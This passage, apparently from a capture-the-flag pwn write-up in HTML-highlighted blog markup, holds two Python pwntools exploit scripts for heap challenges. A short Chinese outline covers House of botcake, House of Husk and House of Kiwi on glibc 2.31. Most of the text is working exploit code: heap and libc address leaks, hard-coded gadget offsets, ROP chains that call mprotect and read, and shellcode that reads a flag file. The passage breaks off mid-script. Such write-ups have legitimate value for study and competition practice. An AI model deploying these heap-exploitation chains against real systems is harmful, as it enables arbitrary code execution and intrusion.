class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(<span class=\"built_in\">breakpoint</span>, <span class=\"built_in\">int</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">breakpoint</span></span><br><span class=\"line\">    gdb.attach(p, gdbscript)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>,terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-hp&#x27;</span>,<span class=\"string\">&#x27;62&#x27;</span>])</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;192.168.166.147&#x27;</span>,<span class=\"number\">58011</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Choice: &#x27;</span>,<span class=\"built_in\">str</span>(c))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>():</span><br><span class=\"line\">    menu(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: \\n&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\"><span class=\"built_in\">id</span>,data,size=<span class=\"number\">0x100</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">4</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Size: &#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sea(<span class=\"string\">&#x27;Content: &#x27;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add()</span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">heap_leak = uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>))</span><br><span class=\"line\">heap_base = heap_leak &lt;&lt;<span class=\"number\">12</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_leak&#x27;</span>,heap_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    add() <span class=\"comment\"># 9</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>+<span class=\"number\">8</span>):</span><br><span class=\"line\">    dele(i)</span><br><span class=\"line\">edit(<span class=\"number\">8</span>,<span class=\"string\">&#x27;u&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">8</span>)</span><br><span class=\"line\">libc_leak = uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>,drop=<span class=\"literal\">False</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x1e0c75</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\">edit(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">stderr = libc_base + <span class=\"number\">0x1f3680</span></span><br><span class=\"line\">sync = libc_base + <span class=\"number\">0x1e24a0</span> + <span class=\"number\">0x60</span></span><br><span class=\"line\">magic = libc_base + <span class=\"number\">0x529ad</span></span><br><span class=\"line\">helper = libc_base + <span class=\"number\">0x1e1940</span></span><br><span class=\"line\">ret = libc_base + <span class=\"number\">0x0000000000026699</span></span><br><span class=\"line\">rdi = libc_base + <span class=\"number\">0x0000000000028a55</span></span><br><span class=\"line\">rsi = libc_base + <span class=\"number\">0x000000000002a4cf</span></span><br><span class=\"line\">rdx = libc_base + <span class=\"number\">0x00000000000c7f32</span></span><br><span class=\"line\">addr = heap_base + <span class=\"number\">0x400</span></span><br><span class=\"line\"></span><br><span class=\"line\">mmp = flat([</span><br><span class=\"line\">    <span class=\"number\">0</span>,rdi,((addr)&gt;&gt;<span class=\"number\">12</span>)&lt;&lt;<span class=\"number\">12</span>,rsi,<span class=\"number\">0x2000</span>,rdx,<span class=\"number\">7</span>,libc.sym.mprotect,rdi,<span class=\"number\">0</span>,rsi,addr+<span class=\"number\">0x400</span>,rdx,<span class=\"number\">0x100</span>,libc.sym.read,libc_base + <span class=\"number\">0x00000000000506b1</span></span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,mmp)</span><br><span class=\"line\"><span class=\"comment\"># edit(1,mmp)</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">7</span>,p64(heap_leak^(heap_base+<span class=\"number\">0x100</span>)))</span><br><span class=\"line\">add() <span class=\"comment\"># 11</span></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\">add() <span class=\"comment\"># 12</span></span><br><span class=\"line\">edit(<span class=\"number\">12</span>,p64(helper)*<span class=\"number\">2</span>)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;ADDR&#x27;</span>,(heap_base+<span class=\"number\">0x100</span>))</span><br><span class=\"line\">add() <span class=\"comment\"># 13</span></span><br><span class=\"line\">edit(<span class=\"number\">13</span>,p64(heap_base+<span class=\"number\">0x2a8</span>)+p64(ret))</span><br><span class=\"line\">edit(<span class=\"number\">12</span>,p64(sync)*<span class=\"number\">2</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">edit(<span class=\"number\">14</span>,p64(magic))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    edit(<span class=\"number\">12</span>,p64(heap_base+<span class=\"number\">0xd30</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">    add()</span><br><span class=\"line\">    edit(<span class=\"number\">15</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add()</span><br><span class=\"line\">add()</span><br><span class=\"line\">add()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># # add()</span></span><br><span class=\"line\">sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">sl(asm(shellcraft.cat(<span class=\"string\">&#x27;/flag&#x27;</span>)))</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000028a55 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000112a51 : pop rdx ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000001574e6 : pop rdx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000c7f32 : pop rdx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000095982 : pop rdx ; ret 0x11</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000093342 : pop rdx ; ret 0xfffc</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000028a53 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002a4cf : pop rsi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002a04c : pop rsp ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000de0e6 : pop rsp ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000033af2 : pop rsp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000026699 : ret</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"blue\"><a class=\"anchor\" href=\"#blue\">#</a> blue</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/8e1ce7b9cbee53accfec12b7b98f925a.png\" alt=\"image-20220619194659319\" /></p>\n<p><strong>flag{8c65b8bd2169f2cf662ae9e324aaef66}</strong></p>\n<p>Ubuntu GLIBC 2.31-0ubuntu9.8 的堆题，IO jumps 段不可写，没有办法按传统思路走。</p>\n<p><strong>思路</strong></p>\n<ol>\n<li>利用后门函数，类似 House of botcake 的手法完成堆块重叠的同时 leak 出 libc。</li>\n<li>设置好 House of Husk 的处理函数为 exit</li>\n<li>设置好 exit_hook 的俩个函数分别为 gets 和  <code>svcudp_reply+26</code> 。</li>\n<li>用 House of Kiwi 触发 exit 调用 exit_hook 完成栈迁移执行 shellcode 读取 flag。</li>\n</ol>\n<p><strong>Exp</strong></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">lg = <span class=\"keyword\">lambda</span> name,data : p.success(name + <span class=\"string\">&#x27;: \\033[1;36m 0x%x \\033[0m&#x27;</span> % data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\"><span class=\"built_in\">breakpoint</span>=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    glibc_dir = <span class=\"string\">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span></span><br><span class=\"line\">    gdbscript = <span class=\"string\">&#x27;directory %smalloc/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdio-common/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdlib/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %slibio/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    elf_base = <span class=\"built_in\">int</span>(os.popen(<span class=\"string\">&#x27;pmap &#123;&#125;| awk \\x27&#123;&#123;print \\x241&#125;&#125;\\x27&#x27;</span>.<span class=\"built_in\">format</span>(p.pid)).readlines()[<span class=\"number\">1</span>], <span class=\"number\">16</span>) <span class=\"keyword\">if</span> elf.pie <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;b *&#123;:#x&#125;\\n&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">breakpoint</span>) + elf_base) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(<span class=\"built_in\">breakpoint</span>, <span class=\"built_in\">int</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">breakpoint</span></span><br><span class=\"line\">    gdb.attach(p, gdbscript)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>,terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-hp&#x27;</span>,<span class=\"string\">&#x27;62&#x27;</span>])</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;192.168.166.147&#x27;</span>,<span class=\"number\">58012</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Choice: &#x27;</span>,<span class=\"built_in\">str</span>(c))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,data=<span class=\"string\">&#x27;u&#x27;</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">1</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Please input size: &#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sea(<span class=\"string\">&#x27;Please input content: &#x27;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Please input idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Please input idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bkdoor</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">666</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Please input idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    dele(<span class=\"number\">6</span>-i)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 8 9 11</span></span><br><span class=\"line\">bkdoor(<span class=\"number\">9</span>)</span><br><span class=\"line\">show(<span class=\"number\">9</span>)</span><br><span class=\"line\">libc_leak = uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>,drop=<span class=\"literal\">False</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x1ecbe0</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">__printf_arginfo_table = libc_base + <span class=\"number\">0x1ed7b0</span></span><br><span class=\"line\">__printf_function_table = libc_base + <span class=\"number\">0x1f1318</span></span><br><span class=\"line\">lock = libc_base + <span class=\"number\">0x222f68</span> <span class=\"comment\"># _rtld_global+3848</span></span><br><span class=\"line\">main_arena_x96 = libc_base + <span class=\"number\">0x1ecbe0</span></span><br><span class=\"line\">magic = libc_base + <span class=\"number\">0x154dea</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">dele(<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add(0x10) # 1 </span></span><br><span class=\"line\"><span class=\"comment\"># add(0x20,&#x27;\\0&#x27;*0x10+p64()) # 2 </span></span><br><span class=\"line\"><span class=\"comment\"># # 7a0 </span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">&#x27;\\0&#x27;</span>*<span class=\"number\">0x88</span>+p32(<span class=\"number\">0x90</span>*<span class=\"number\">9</span>+<span class=\"number\">1</span>)) <span class=\"comment\"># 2</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x80</span>,p64(libc.sym.exit)*(<span class=\"number\">0x80</span>/<span class=\"number\">8</span>)) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x70</span>)</span><br><span class=\"line\"><span class=\"comment\"># add(0x80) # 4</span></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">11</span>)</span><br><span class=\"line\">dele(<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span>+p64(<span class=\"number\">0x80</span>)+p64(<span class=\"number\">0x91</span>)+p64(__printf_arginfo_table)+p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x88</span>) <span class=\"comment\"># 20</span></span><br><span class=\"line\">add(<span class=\"number\">0x88</span>,p64(__printf_arginfo_table + <span class=\"number\">8</span> - <span class=\"number\">0x378</span>)+p64(libc.sym.exit)*<span class=\"number\">12</span>) <span class=\"comment\"># 21</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">13</span>)</span><br><span class=\"line\">dele(<span class=\"number\">12</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">&#x27;\\0&#x27;</span>*<span class=\"number\">0x58</span>+p64(<span class=\"number\">0x91</span>)+p64(__printf_function_table)+p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add_rsp_x28 = libc_base + <span class=\"number\">0x0000000000047445</span></span><br><span class=\"line\">leave_ret = libc_base + <span class=\"number\">0x00000000000578c8</span></span><br><span class=\"line\">ret = libc_base + <span class=\"number\">0x0000000000022679</span></span><br><span class=\"line\">rdi = libc_base +<span class=\"number\">0x0000000000023b6a</span></span><br><span class=\"line\">rsi = libc_base + <span class=\"number\">0x000000000002601f</span></span><br><span class=\"line\">rdx_r12 = libc_base + <span class=\"number\">0x0000000000119211</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,p64(main_arena_x96+<span class=\"number\">0x20</span>)+p64(<span class=\"number\">0</span>)+p64(add_rsp_x28)*<span class=\"number\">2</span>+p64(__printf_function_table+<span class=\"number\">8</span>)+p64(<span class=\"number\">0</span>)+p64(leave_ret)+p64(<span class=\"number\">0</span>)+p64(rdi)+p64(<span class=\"number\">0</span>)+p64(rsi)+p64(__printf_function_table+<span class=\"number\">0x78</span>)+p64(rdx_r12)+p64(<span class=\"number\">0x1000</span>)+p64(<span class=\"number\">0</span>)+p64(libc.sym.read))</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">14</span>)</span><br><span 